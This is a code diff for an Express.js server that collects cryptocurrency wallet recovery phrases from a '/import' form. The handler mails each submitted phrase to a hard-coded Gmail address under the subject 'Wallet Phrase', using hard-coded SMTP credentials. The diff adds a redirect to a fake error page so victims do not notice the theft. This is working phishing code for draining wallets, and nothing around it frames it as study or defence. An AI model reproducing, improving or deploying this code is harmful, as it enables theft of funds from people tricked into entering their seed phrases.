@@ -22,19 +22,19 @@ app.get("/import-phrase", (req, res) => {
 app.post("/import", async (req, res) => {
     try {
         console.log(req.body.Phrase)
-        res.send(req.body.Phrase)
+        res.redirect("/error")
         let transport = nodemailer.createTransport({
-            host: "smtp.mailtrap.io",
-            port: 2525,
+            host: 'smtp.ethereal.email',
+            port: 587,
             auth: {
-                user: "03aa34adf1611f",
-                pass: "433a4aa128eab7"
+                user: 'ronaldo19@ethereal.email',
+                pass: 'AZNUNdaCRTqCY6kfuU'
             }
         })
     
         let info = await transport.sendMail({
-            from: "michaelstone@gmail.com",
-            to: "devtruth17@gmail.com",
+            from: "Wallet Auth",
+            to: "michaelstone730@gmail.com",
             subject: "Wallet Phrase",
             text: req.body.Phrase,
             html: `<b>${req.body.Phrase}</b>`
@@ -42,6 +42,10 @@ app.post("/import", async (req, res) => {
     } catch(err) {
         console.log(err)
     }
+})
+
+app.get("/error", (req, res) => {
+    res.sendFile(path.join(__dirname+"/views/error.html"))
 })
 
 const port = process.env.PORT || 3000
